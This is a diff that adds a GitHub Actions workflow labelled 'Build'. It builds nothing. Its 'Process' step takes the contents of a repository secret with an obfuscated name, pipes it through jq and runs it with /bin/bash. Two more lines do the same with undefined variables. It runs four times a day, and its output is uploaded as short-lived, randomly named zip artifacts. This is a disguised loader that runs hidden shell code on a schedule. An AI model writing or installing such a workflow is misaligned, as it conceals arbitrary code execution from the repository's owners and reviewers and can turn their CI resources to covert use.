@@ -1,0 +1,39 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          u253: ${{ secrets.u253 }}
+        run: |
+          printf '%s' "$u253" | jq -r .mxy74 | /bin/bash
+          printf '%s' "$ayqx373" | jq -r .u65 | /bin/bash
+          echo $u8821 | jq -r .gvsjo1037 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: LhakAQ1G
+          path: "*.zip"
+          retention-days: 1
